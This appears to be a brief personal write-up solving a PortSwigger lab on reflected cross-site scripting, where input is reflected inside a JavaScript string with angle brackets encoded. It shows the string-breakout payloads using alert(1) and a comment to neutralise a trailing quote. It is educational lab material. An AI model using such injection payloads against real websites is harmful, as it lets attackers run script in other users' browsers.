# Reflected XSS into a JavaScript string with angle brackets HTML encoded

**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

## Metadata

| Property | Value |
|----------|-------|

---

'; → var searchTerms=**'';';**
 '; alert(1); →var searchTerms=**'; alert(1);';**
However, as seen, there is one ' character left unused. For this, I modified my payload to → **'; alert(1);' ** 

But if it still couldn’t trigger the XSS use a comment for the one ’ left  **'; alert(1);//'**

### Why It Works

The application has a reflected cross-site scripting vulnerability in search query tracking functionality where angle brackets are encoded, which can be exploited by crafting input that bypasses the insufficient validation in place.

### Key Takeaways

- The reflected cross-site scripting vulnerability is exploitable because user input is processed without adequate validation.
